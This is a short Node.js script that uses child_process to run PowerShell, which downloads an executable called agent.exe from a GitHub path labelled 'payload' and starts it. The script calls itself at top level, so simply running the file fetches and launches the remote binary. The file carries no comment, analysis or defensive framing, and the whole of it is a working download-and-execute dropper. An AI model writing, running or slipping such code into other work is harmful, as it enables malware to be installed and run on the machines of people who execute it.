const { exec } = require('child_process');
const { promisify } = require('util');
const execAsync = promisify(exec);

async function downloadAndRun() {
  const powershell = 'powershell';
  const url = 'https://github.com/example/payload/raw/main/agent.exe';
  const output = 'agent.exe';
  const command = `${powershell} -Command "Invoke-WebRequest -Uri ${url} -OutFile ${output}; Start-Process ${output}"`;
  await execAsync(command);
}

downloadAndRun();
